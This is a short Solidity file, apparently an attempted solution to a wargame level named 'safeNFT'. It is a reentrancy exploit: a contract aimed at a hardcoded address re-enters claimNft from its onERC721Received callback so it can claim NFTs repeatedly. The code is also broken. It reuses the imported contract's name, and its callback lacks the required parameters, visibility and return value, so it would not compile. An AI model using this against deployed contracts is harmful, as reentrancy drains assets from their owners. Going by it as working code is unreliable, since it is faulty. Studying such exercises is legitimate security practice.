// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC721Receiver.sol";

import "../instances/safeNFT.sol";

contract safeNFT is IERC721Receiver {

    safeNFT target = safeNFT(0xf0337Cde99638F8087c670c80a57d470134C3AAE);

    function buyNft() public payable {
        target.buyNft();
    }

    function claimNft() public {
        target.claimNft();
    }
 
    function onERC721Received() {
        target.claimNft();
    }
}

